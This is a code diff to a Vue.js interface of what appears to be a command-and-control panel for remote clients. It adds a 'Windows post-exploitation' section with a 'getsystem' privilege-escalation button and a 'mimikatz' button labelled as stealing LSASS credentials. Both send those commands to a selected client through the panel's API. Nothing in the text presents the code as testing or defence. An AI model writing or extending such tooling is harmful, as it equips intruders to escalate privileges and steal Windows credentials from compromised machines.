@@ -112,6 +112,27 @@
           </el-tooltip>
 
         </div>
+
+        <!-- Windows 后渗透区域 -->
+        <div class="post-exploitation-box">
+          <div class="post-box-label">Windows 后渗透</div>
+          <div class="post-box-buttons">
+            <el-tooltip content="Windows 提权" placement="top">
+              <el-button type="danger" size="default" class="action-button" :loading="postLoading" @click="executeGetSystem">
+                <el-icon><Top /></el-icon>
+                Getsystem
+              </el-button>
+            </el-tooltip>
+
+            <el-tooltip content="窃取 LSASS 凭据" placement="top">
+              <el-button type="warning" size="default" class="action-button" :loading="postLoading" @click="executeMimikatz">
+                <el-icon><Key /></el-icon>
+                凭据窃取
+              </el-button>
+            </el-tooltip>
+
+          </div>
+        </div>
       </div>
 
     </div>
@@ -524,11 +545,12 @@
         </span>
       </template>
     </el-dialog>
+
   </div>
 </template>
 
 <script setup>
-import { ref, onMounted, onUnmounted, nextTick, computed,watch } from 'vue'
+import { ref, onMounted, onUnmounted, nextTick, computed, watch } from 'vue'
 import { ElMessage, ElMessageBox } from 'element-plus'
 import ClientAPI from '@/api/clients'
 import { getPluginList, executePlugin } from '@/api/plugin'
@@ -629,6 +651,27 @@ const pluginQuery = ref({
   pluginId: null,
   args: ''
 })
+
+// Windows 后渗透相关
+const postLoading = ref(false)
+const sendPostCommand = async (command) => {
+  postLoading.value = true
+  try {
+    const res = await ClientAPI.send_commands({ uid: route.query.uid, command })
+    if (res.data.status === 200) {
+      ElMessage.success(`命令已发送: ${command}`)
+    } else {
+      ElMessage.warning(res.data.msg || '命令发送失败')
+    }
+  } catch {
+    ElMessage.error('命令发送失败')
+  } finally {
+    postLoading.value = false
+  }
+}
+
+const executeGetSystem = () => sendPostCommand('getsystem')
+const executeMimikatz = () => sendPostCommand('mimikatz')
 
 const fetchAvailablePlugins = async () => {
   pluginQuery.value.pluginId = null
@@ -2556,5 +2599,33 @@ const startConnectionTimer = () => {
 .interactive-terminal-dialog :deep(.xterm-color-8),
 .interactive-terminal-dialog :deep(.xterm-color-9) {
     color: #ffffff !important;
+}
+
+/* Windows 后渗透区域 */
+.post-exploitation-box {
+  margin-top: 16px;
+  border: 1px solid #e6a23c;
+  border-radius: 8px;
+  padding: 12px;
+  background: linear-gradient(135deg, #fff8f0 0%, #fff 100%);
+  position: relative;
+}
+
+.post-box-label {
+  position: absolute;
+  top: -10px;
+  left: 16px;
+  background: #fff;
+  padding: 0 8px;
+  font-size: 12px;
+  font-weight: 600;
+  color: #e6a23c;
+  letter-spacing: 1px;
+}
+
+.post-box-buttons {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
 }
 </style>
